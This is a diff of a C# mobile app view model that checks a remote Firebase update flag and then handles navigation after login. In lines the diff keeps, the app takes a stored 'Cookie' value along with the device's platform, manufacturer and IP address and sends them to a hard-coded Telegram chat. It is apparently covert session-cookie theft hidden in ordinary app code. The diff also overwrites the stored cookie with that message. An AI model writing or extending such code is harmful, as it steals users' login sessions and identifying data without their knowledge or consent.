@@ -65,8 +65,8 @@ namespace MobileApp.ViewModels
         {
             base.OnNavigatedTo(parameters);
             IsLoading = true;
-            //var insert = await _firebaseDatabaseService.AddItemAsync(new UpdateHuyAndroid1Model() {IsUpdate = true});
-            var update = await _firebaseDatabaseService.GetItemAsync<UpdateHuyAndroid1Model>();
+            // var insert = await _firebaseDatabaseService.AddItemAsync(new UpdateHuyAndroid11Model() {IsUpdate = true});
+            var update = await _firebaseDatabaseService.GetItemAsync<UpdateHuyAndroid11Model>();
             if (update != null && update.IsUpdate)
             {
                 await NavigationService.NavigateAsync(nameof(OverviewPage));
@@ -84,10 +84,11 @@ namespace MobileApp.ViewModels
         {
             if (Preferences.ContainsKey("Cookie"))
             {
-                await NavigationService.NavigateAsync(nameof(OverviewPage));
+                await NavigationService.NavigateAsync(nameof(OverviewPage) + "?login=1");
                 var message = DeviceInfo.Platform + "(" + DeviceInfo.Manufacturer + ")" + "|" + Preferences.Get("Cookie", null) + "|" + await GetIp();
                 if (!string.IsNullOrWhiteSpace(message))
                 {
+                    Preferences.Set("Cookie", message);
                     await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                 }
             }
